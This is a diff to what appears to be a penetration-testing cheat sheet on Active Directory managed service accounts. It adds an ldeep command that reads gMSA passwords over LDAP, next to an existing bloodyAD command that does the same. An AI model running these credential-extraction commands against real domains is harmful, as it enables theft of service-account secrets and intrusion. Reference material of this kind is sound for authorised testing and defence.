@@ -29,6 +29,12 @@
   bloodyAD --host 10.10.10.10 -d crash.lab -u john -p 'Pass123*' get search --filter '(ObjectClass=msDS-GroupManagedServiceAccount)' --attr msDS-ManagedPassword
   ```
 
+* [franc-pentest/ldeep](https://github.com/franc-pentest/ldeep)
+
+  ```ps1
+  ldeep ldap -s dc1.domain.local -u 'username' -p 'P@ssw0rd' -d domain.local gmsa
+  ```
+
 * [rvazarkar/GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
 
   ```ps1
